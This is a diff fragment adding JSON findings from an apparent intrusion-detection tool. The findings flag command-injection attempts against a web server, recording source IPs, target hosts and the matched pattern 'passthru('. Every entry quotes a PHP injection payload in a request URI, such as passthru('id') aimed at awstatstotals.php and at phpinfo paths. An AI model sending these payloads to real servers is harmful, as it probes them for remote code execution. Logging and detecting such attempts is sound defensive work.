+      "type": "command_injection",
+      "value": "54.235.163.229 → /stat/awstatstotals.php?sort={%24{passthru(chr(105).chr(100))}}{%24{exit()}}",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "54.235.163.229",
+        "uri": "/stat/awstatstotals.php?sort={%24{passthru(chr(105).chr(100))}}{%24{exit()}}",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "host-90-236-3-35.mobileonline.telia.com"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "67.207.202.9 → /%3C?passthru(%22id%22);?%3E/phpinfo/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "67.207.202.9",
+        "uri": "/%3C?passthru(%22id%22);?%3E/phpinfo/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "90.236.3.35"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "67.207.202.9 → /%3C?passthru('id');?%3E/phpinfo/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "67.207.202.9",
+        "uri": "/%3C?passthru('id');?%3E/phpinfo/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "90.236.3.35"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "67.207.202.9 → /phpinfo/%3C?passthru(%22id%22);?%3E/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "67.207.202.9",
+        "uri": "/phpinfo/%3C?passthru(%22id%22);?%3E/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "90.236.3.35"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "67.207.202.9 → /phpinfo/%3C?passthru('id');?%3E/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "67.207.202.9",
+        "uri": "/phpinfo/%3C?passthru('id');?%3E/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "90.236.3.35"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "67.207.202.9 → /phpinfo/phpinfo/%3C?passthru(%22id%22);?%3E?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "67.207.202.9",
+        "uri": "/phpinfo/phpinfo/%3C?passthru(%22id%22);?%3E?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "90.236.3.35"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "67.207.202.9 → /phpinfo/phpinfo/%3C?passthru('id');?%3E?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "67.207.202.9",
+        "uri": "/phpinfo/phpinfo/%3C?passthru('id');?%3E?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "90.236.3.35"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "67.207.202.9 → /phpinfo/phpinfo/index.php?=%3C?passthru(%22id%22);?%3E",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "67.207.202.9",
+        "uri": "/phpinfo/phpinfo/index.php?=%3C?passthru(%22id%22);?%3E",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "90.236.3.35"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
+    },
+    {
+      "type": "command_injection",
+      "value": "67.207.202.9 → /phpinfo/phpinfo/index.php?=%3C?passthru('id');?%3E",
+      "confidence": 0.9,
+      "evidence": {
+        "src_ip": "67.207.202.9",
+        "uri": "/phpinfo/phpinfo/index.php?=%3C?passthru('id');?%3E",
+        "count": 1,
+        "matched_high": [
+          "passthru("
+        ],
+        "matched_medium": [],
+        "matched_patterns": [
+          "passthru("
+        ],
+        "methods": [
+          "GET"
+        ],
+        "hosts": [
+          "90.236.3.35"
+        ],
+        "dst_ports": [
+          80
+        ]
+      },
+      "first_seen": null,
+      "last_seen": null
     }
   ]
 }
